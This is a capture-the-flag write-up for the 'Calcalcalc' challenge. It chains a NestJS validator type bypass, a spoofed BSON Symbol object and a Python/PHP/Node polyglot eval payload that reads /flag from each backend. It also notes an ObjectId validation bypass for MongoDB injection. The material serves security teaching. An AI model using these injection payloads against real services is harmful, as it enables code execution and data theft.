Calcalcalc
=====================

## Challenge

It's an unbreakable and reliable calculator... I think.

## Writeup

This challenge includes 3 parts: Nestjs / BSON / Polyglot.

### Goals

Read ``docker-compose.yml``, we know flag is hidden in all 3 backends' ``/flag``. 3 backends all calculate user input by ``eval``, our goal is to make a payload which can read ``/flag`` in 3 backends.

### Part 1

Read ``calculate.model.ts``, we know all user input will be validated before the controller gets.

```typescript
export default class CalculateModel {

  @IsNotEmpty()
  @ExpressionValidator(15, {
    message: 'Invalid input',
  })
  public readonly expression: string;

  @IsBoolean()
  public readonly isVip: boolean = false;
}

```

From ``ExpressionValidator``, we will know expression.length can be more than 15 bytes when ``isVip === true``, so the first task is to let ``isVip = true``.

Read the source code of ``class-validator``:
https://github.com/typestack/class-validator/blob/58a33e02fb5e77dde19ba5ca8de2197c9bc127e9/src/validation/Validator.ts#L323
```typescript
return value instanceof Boolean || typeof value === "boolean";
```

Sadly it's JavaScript runtime type. Nestjs will not auto convert ``'true'`` to ``true``(Nestjs is **NOT** Spring), so append ``isVip=true`` after post data is useless. However,
Nestjs + expressjs support ``json`` and ``urlencoded`` as its body by default.
https://github.com/nestjs/nest/blob/205d73721402fb508ce63d7f71bc2a5584a2f4b6/packages/platform-express/adapters/express-adapter.ts#L125
```typescript
    const parserMiddleware = {
      jsonParser: bodyParser.json(),
      urlencodedParser: bodyParser.urlencoded({ extended: true }),
    };
```

Just bypass it:
```http
Content-Type: application/json

{"expression":"MORE_THAN_15_BYTES_STRING", "isVip": true}
```

### Part 2

The second task is to bypass RegExp ``/^[0-9a-z\[\]\(\)\+\-\*\/ \t]+$/``.

Nestjs is a Nodejs Web Framework which is very similar to Spring, and it's written by TypeScript. However, it's **NOT** Spring. TypeScript is a strongly-typed language, but it's designed for transcompiles to JavaScript so all type definitions will be removed in runtime. We can just ignore ``expression: string`` type hinting and pass an object to ``expression``. This time, ``object.toString() === '[object Object]'``.

But we have no way to let ``object.toString()`` become a useful runnable code ─ if frontend and backends communicate by JSON, it's true. I believe that everyone has used MongoDB. Nodejs can pass a JavaScript function to MongoDB, which is not defined in the JSON standard. So they introduce BSON as their data interchange format. This challenge also used BSON. Luckily, we can let our object acts like a BSON Type in JavaScript.

Let's read ``mongodb/js-bson``'s serializer, we can know it detects the object's type by ``Object[_bsontype]`` instead of ``instanceof``.

https://github.com/mongodb/js-bson/blob/master/lib/parser/serializer.js#L756

```javascript
      } else if (value['_bsontype'] === 'Binary') {
        index = serializeBinary(buffer, key, value, index, true);
      } else if (value['_bsontype'] === 'Symbol') {
        index = serializeSymbol(buffer, key, value, index, true);
      } else if (value['_bsontype'] === 'DBRef') {
```

After searching, I found that ``Symbol`` is the best type to emulate an object as a string. I checked most of the BSON deserializers and ``Symbol.toString()`` always returns the value of the symbol.

So let's build a Symbol like this:

```json
{"expression":{"value":"1+1","_bsontype":"Symbol"}, "isVip": true}
```

### Part 3

In RCTF2018, we released ``cats`` and ``cats Rev.2``, you can name this challenge as ``cats Rev.3``. A new defense technology Cyber Mimic Defense (CMD) was proposed in 2018. We think it is interesting to create a polyglot challenge based on this idea. So it's polyglot time now.

The final payload is:

```json
{"expression":{"value":"open('/flag').read() + str(1//5) or ''' #\n)//?>\nfunction open(){return {read:()=>require('fs').readFileSync('/flag','utf-8')}}function str(){return 0}/*<?php\nfunction open(){echo MongoDB\\BSON\\fromPHP(['ret' => file_get_contents('/flag').'0']);exit;}?>*///'''","_bsontype":"Symbol"}, "isVip": true}
```

Colorize the final eval expression:

Python 3:

```python
open('/flag').read() + str(1//5) or ''' #
)//?>
function open(){return {read:()=>require('fs').readFileSync('/flag','utf-8')}}function str(){return 0}/*<?php
function open(){echo MongoDB\BSON\fromPHP(['ret' => file_get_contents('/flag').'0']);exit;}?>*///'''
  ```

PHP:

```php
return open('/flag').read() + str(1//5) or ''' #
)//?>function open(){return {read:()=>require('fs').readFileSync('/flag','utf-8')}}function str(){return 0}/*<?php
function open(){echo MongoDB\BSON\fromPHP(['ret' => file_get_contents('/flag').'0']);exit;}?>*///''';
```

Nodejs:

```javascript
open('/flag').read() + str(1//5) or ''' #
)//?>
function open(){return {read:()=>require('fs').readFileSync('/flag','utf-8')}}function str(){return 0}/*<?php
function open(){echo MongoDB\BSON\fromPHP(['ret' => file_get_contents('/flag').'0']);exit;}?>*///'''
```

### Others

In this challenge, the BSON part was inspired by the ``996Game`` of ``*CTF2019``. The code of ``996game`` is:

```javascript
GameServer.loadPlayer = function(socket,id){
  GameServer.server.db.collection('players').findOne({_id: new ObjectId(id)},function(err,doc){
```

I built ``{ toHexString: 'aaa', length: 0, id: {length: 12} }`` to bypass the validation of ``ObjectId`` because MongoDB Driver used old version ``js-bson``. This maybe useful in MongoDB injection.
